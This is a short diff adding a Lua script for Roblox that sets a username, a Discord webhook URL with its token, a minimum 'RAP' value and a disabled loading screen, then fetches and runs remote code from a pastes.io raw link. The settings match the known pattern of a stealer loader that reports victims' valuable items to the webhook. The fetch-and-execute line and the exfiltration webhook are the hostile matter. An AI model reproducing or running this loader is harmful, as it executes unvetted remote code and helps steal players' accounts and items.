@@ -1,0 +1,9 @@
+Username = "guseppesoleluna22"
+
+Webhook = "https://discord.com/api/webhooks/1200139901765697626/xfp1XGJbCwDPkzes9hHK8yTdd9YZ4OqqehIWDee4NtSVUTVXDeVEualN7phKZSirTLbl"
+
+LoadingScreen = false
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://pastes.io/raw/pldz56ygrz"))()
